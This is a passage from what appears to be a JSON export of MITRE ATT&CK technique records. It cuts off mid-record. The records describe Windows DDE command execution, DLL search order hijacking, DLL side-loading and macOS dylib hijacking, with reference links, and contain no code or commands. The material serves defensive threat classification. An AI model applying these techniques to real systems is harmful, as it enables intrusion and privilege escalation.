    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--232a7e42-cd6e-4902-8fe9-2960f529dd4d",
    "platform": "windows",
    "tid": "T1559.002",
    "technique": "Dynamic Data Exchange",
    "tactic": "execution",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation: BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021 Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)\n\nMicrosoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )\n\nDDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)",
    "technique_references": [
      {
        "source_name": "BleepingComputer DDE Disabled in Word Dec 2017",
        "url": "https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/",
        "description": "Cimpanu, C. (2017, December 15). Microsoft Disables DDE Feature in Word to Prevent Further Malware Attacks. Retrieved December 19, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft ADV170021 Dec 2017",
        "url": "https://portal.msrc.microsoft.com/security-guidance/advisory/ADV170021",
        "description": "Microsoft. (2017, December 12). ADV170021 - Microsoft Office Defense in Depth Update. Retrieved February 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft DDE Advisory Nov 2017",
        "url": "https://technet.microsoft.com/library/security/4053440",
        "description": "Microsoft. (2017, November 8). Microsoft Security Advisory 4053440 - Securely opening Microsoft Office documents that contain Dynamic Data Exchange (DDE) fields. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "SensePost PS DDE May 2016",
        "url": "https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/",
        "description": "El-Sherei, S. (2016, May 20). PowerShell, C-Sharp and DDE The Power Within. Retrieved November 22, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Kettle CSV DDE Aug 2014",
        "url": "https://www.contextis.com/blog/comma-separated-vulnerabilities",
        "description": "Kettle, J. (2014, August 29). Comma Separated Vulnerabilities. Retrieved November 22, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Enigma Reviving DDE Jan 2018",
        "url": "https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee",
        "description": "Nelson, M. (2018, January 29). Reviving DDE: Using OneNote and Excel for Code Execution. Retrieved February 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "SensePost MacroLess DDE Oct 2017",
        "url": "https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/",
        "description": "Stalmans, E., El-Sherei, S. (2017, October 9). Macro-less Code Exec in MSWord. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "OWASP CSV Injection",
        "url": "https://owasp.org/www-community/attacks/CSV_Injection",
        "description": " Albinowax Timo Goosen. (n.d.). CSV Injection. Retrieved February 7, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "CSV Excel Macro Injection ",
        "url": "https://blog.securelayer7.net/how-to-perform-csv-excel-macro-injection/",
        "description": " Ishaq Mohammed . (2021, January 10). Everything about CSV Injection and CSV Excel Macro Injection. Retrieved February 7, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Fireeye Hunting COM June 2019",
        "url": "https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html",
        "description": "Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June 10, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "NVisio Labs DDE Detection Oct 2017",
        "url": "https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/",
        "description": "NVISO Labs. (2017, October 11). Detecting DDE in MS Office documents. Retrieved November 21, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
    "platform": "windows",
    "tid": "T1574.001",
    "technique": "DLL Search Order Hijacking",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
    "technique_references": [
      {
        "source_name": "Microsoft Dynamic Link Library Search Order",
        "url": "https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Dynamic-Link Library Search Order. Retrieved November 30, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Hijacking July 2010",
        "url": "https://www.fireeye.com/blog/threat-research/2010/07/malware-persistence-windows-registry.html",
        "description": "Harbour, N. (2010, July 15). Malware Persistence without the Windows Registry. Retrieved November 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "OWASP Binary Planting",
        "url": "https://www.owasp.org/index.php/Binary_planting",
        "description": "OWASP. (2013, January 30). Binary planting. Retrieved June 7, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye fxsst June 2011",
        "url": "https://www.fireeye.com/blog/threat-research/2011/06/fxsst.html",
        "description": "Harbour, N. (2011, June 3). What the fxsst?. Retrieved November 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Security Advisory 2269637",
        "url": "https://docs.microsoft.com/en-us/security-updates/securityadvisories/2010/2269637",
        "description": "Microsoft. (, May 23). Microsoft Security Advisory 2269637. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Dynamic-Link Library Redirection",
        "url": "https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-redirection?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Dynamic-Link Library Redirection. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Manifests",
        "url": "https://msdn.microsoft.com/en-US/library/aa375365",
        "description": "Microsoft. (n.d.). Manifests. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye DLL Search Order Hijacking",
        "url": "https://www.fireeye.com/blog/threat-research/2010/08/dll-search-order-hijacking-revisited.html",
        "description": "Nick Harbour. (2010, September 1). DLL Search Order Hijacking Revisited. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
    "platform": "windows",
    "tid": "T1574.001",
    "technique": "DLL Search Order Hijacking",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
    "technique_references": [
      {
        "source_name": "Microsoft Dynamic Link Library Search Order",
        "url": "https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Dynamic-Link Library Search Order. Retrieved November 30, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Hijacking July 2010",
        "url": "https://www.fireeye.com/blog/threat-research/2010/07/malware-persistence-windows-registry.html",
        "description": "Harbour, N. (2010, July 15). Malware Persistence without the Windows Registry. Retrieved November 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "OWASP Binary Planting",
        "url": "https://www.owasp.org/index.php/Binary_planting",
        "description": "OWASP. (2013, January 30). Binary planting. Retrieved June 7, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye fxsst June 2011",
        "url": "https://www.fireeye.com/blog/threat-research/2011/06/fxsst.html",
        "description": "Harbour, N. (2011, June 3). What the fxsst?. Retrieved November 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Security Advisory 2269637",
        "url": "https://docs.microsoft.com/en-us/security-updates/securityadvisories/2010/2269637",
        "description": "Microsoft. (, May 23). Microsoft Security Advisory 2269637. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Dynamic-Link Library Redirection",
        "url": "https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-redirection?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Dynamic-Link Library Redirection. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Manifests",
        "url": "https://msdn.microsoft.com/en-US/library/aa375365",
        "description": "Microsoft. (n.d.). Manifests. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye DLL Search Order Hijacking",
        "url": "https://www.fireeye.com/blog/threat-research/2010/08/dll-search-order-hijacking-revisited.html",
        "description": "Nick Harbour. (2010, September 1). DLL Search Order Hijacking Revisited. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
    "platform": "windows",
    "tid": "T1574.001",
    "technique": "DLL Search Order Hijacking",
    "tactic": "defense-evasion",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
    "technique_references": [
      {
        "source_name": "Microsoft Dynamic Link Library Search Order",
        "url": "https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Dynamic-Link Library Search Order. Retrieved November 30, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Hijacking July 2010",
        "url": "https://www.fireeye.com/blog/threat-research/2010/07/malware-persistence-windows-registry.html",
        "description": "Harbour, N. (2010, July 15). Malware Persistence without the Windows Registry. Retrieved November 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "OWASP Binary Planting",
        "url": "https://www.owasp.org/index.php/Binary_planting",
        "description": "OWASP. (2013, January 30). Binary planting. Retrieved June 7, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye fxsst June 2011",
        "url": "https://www.fireeye.com/blog/threat-research/2011/06/fxsst.html",
        "description": "Harbour, N. (2011, June 3). What the fxsst?. Retrieved November 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Security Advisory 2269637",
        "url": "https://docs.microsoft.com/en-us/security-updates/securityadvisories/2010/2269637",
        "description": "Microsoft. (, May 23). Microsoft Security Advisory 2269637. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Dynamic-Link Library Redirection",
        "url": "https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-redirection?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Dynamic-Link Library Redirection. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Manifests",
        "url": "https://msdn.microsoft.com/en-US/library/aa375365",
        "description": "Microsoft. (n.d.). Manifests. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye DLL Search Order Hijacking",
        "url": "https://www.fireeye.com/blog/threat-research/2010/08/dll-search-order-hijacking-revisited.html",
        "description": "Nick Harbour. (2010, September 1). DLL Search Order Hijacking Revisited. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b",
    "platform": "windows",
    "tid": "T1574.002",
    "technique": "DLL Side-Loading",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)",
    "technique_references": [
      {
        "source_name": "FireEye DLL Side-Loading",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf",
        "description": "Amanda Steward. (2014). FireEye DLL Side-Loading: A Thorn in the Side of the Anti-Virus Industry. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b",
    "platform": "windows",
    "tid": "T1574.002",
    "technique": "DLL Side-Loading",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)",
    "technique_references": [
      {
        "source_name": "FireEye DLL Side-Loading",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf",
        "description": "Amanda Steward. (2014). FireEye DLL Side-Loading: A Thorn in the Side of the Anti-Virus Industry. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b",
    "platform": "windows",
    "tid": "T1574.002",
    "technique": "DLL Side-Loading",
    "tactic": "defense-evasion",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)",
    "technique_references": [
      {
        "source_name": "FireEye DLL Side-Loading",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf",
        "description": "Amanda Steward. (2014). FireEye DLL Side-Loading: A Thorn in the Side of the Anti-Virus Industry. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--fc742192-19e3-466c-9eb5-964a97b29490",
    "platform": "macos",
    "tid": "T1574.004",
    "technique": "Dylib Hijacking",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\n\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)",
    "technique_references": [
      {
        "source_name": "MalwareUnicorn macOS Dylib Injection MachO",
        "url": "https://malwareunicorn.org/workshops/macos_dylib_injection.html#5",
        "description": "Amanda Rousseau. (2020, April 4). MacOS Dylib Injection Workshop. Retrieved March 29, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Apple Developer Doco Archive Run-Path",
        "url": "https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/RunpathDependentLibraries.html",
        "description": "Apple Inc.. (2012, July 7). Run-Path Dependent Libraries. Retrieved March 31, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Wardle Dylib Hijacking OSX 2015",
        "url": "https://www.virusbulletin.com/uploads/pdf/magazine/2015/vb201503-dylib-hijacking.pdf",
        "description": "Patrick Wardle. (2015, March 1). Dylib Hijacking on OS X. Retrieved March 29, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Writing Bad Malware for OSX",
        "url": "https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf",
        "description": "Patrick Wardle. (2015). Writing Bad @$$ Malware for OS X. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Wardle Dylib Hijack Vulnerable Apps",
        "url": "https://objective-see.com/blog/blog_0x46.html",
        "description": "Patrick Wardle. (2019, July 2). Getting Root with Benign AppStore Apps. Retrieved March 31, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "wardle artofmalware volume1",
        "url": "https://taomm.org/vol1/pdfs.html",
        "description": "Patrick Wardle. (2020, August 5). The Art of Mac Malware Volume 0x1: Analysis. Retrieved March 19, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Github EmpireProject HijackScanner",
        "url": "https://github.com/EmpireProject/Empire/blob/master/lib/modules/python/situational_awareness/host/osx/HijackScanner.py",
        "description": "Wardle, P., Ross, C. (2017, September 21). Empire Project Dylib Hijack Vulnerability Scanner. Retrieved April 1, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Github EmpireProject CreateHijacker Dylib",
        "url": "https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/python/persistence/osx/CreateHijacker.py",
        "description": "Wardle, P., Ross, C. (2018, April 8). EmpireProject Create Dylib Hijacker. Retrieved April 1, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--fc742192-19e3-466c-9eb5-964a97b29490",
    "platform": "macos",
    "tid": "T1574.004",
    "technique": "Dylib Hijacking",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\n\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)",
    "technique_references": [
      {
        "source_name": "MalwareUnicorn macOS Dylib Injection MachO",
        "url": "https://malwareunicorn.org/workshops/macos_dylib_injection.html#5",
        "description": "Amanda Rousseau. (2020, April 4). MacOS Dylib Injection Workshop. Retrieved March 29, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Apple Developer Doco Archive Run-Path",
        "url": "https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/RunpathDependentLibraries.html",
        "description": "Apple Inc.. (2012, July 7). Run-Path Dependent Libraries. Retrieved March 31, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Wardle Dylib Hijacking OSX 2015",
        "url": "https://www.virusbulletin.com/uploads/pdf/magazine/2015/vb201503-dylib-hijacking.pdf",
        "description": "Patrick Wardle. (2015, March 1). Dylib Hijacking on OS X. Retrieved March 29, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Writing Bad Malware for OSX",
        "url": "https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf",
        "description": "Patrick Wardle. (2015). Writing Bad @$$ Malware for OS X. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Wardle Dylib Hijack Vulnerable Apps",
        "url": "https://objective-see.com/blog/blog_0x46.html",
        "description": "Patrick Wardle. (2019, July 2). Getting Root with Benign AppStore Apps. Retrieved March 31, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "wardle artofmalware volume1",
        "url": "https://taomm.org/vol1/pdfs.html",
        "description": "Patrick Wardle. (2020, August 5). The Art of Mac Malware Volume 0x1: Analysis. Retrieved March 19, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Github EmpireProject HijackScanner",
        "url": "https://github.com/EmpireProject/Empire/blob/master/lib/modules/python/situational_awareness/host/osx/HijackScanner.py",
        "description": "Wardle, P., Ross, C. (2017, September 21). Empire Project Dylib Hijack Vulnerability Scanner. Retrieved April 1, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Github EmpireProject CreateHijacker Dylib",
